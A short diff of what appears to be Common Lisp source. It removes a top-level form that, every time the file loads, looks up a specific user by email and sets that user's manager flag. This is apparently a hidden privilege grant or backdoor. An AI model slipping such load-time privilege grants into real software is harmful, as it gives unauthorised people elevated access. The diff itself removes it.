@@ -136,8 +136,3 @@
            (setf block-it t))))
      (unless block-it
        ,@body)))
-
-(with-open-store (*store-spec*)
-  (let ((user (query-userinfo-by-email "logsniper@outlook.com")))
-    (if user
-      (setf (manager user) t))))
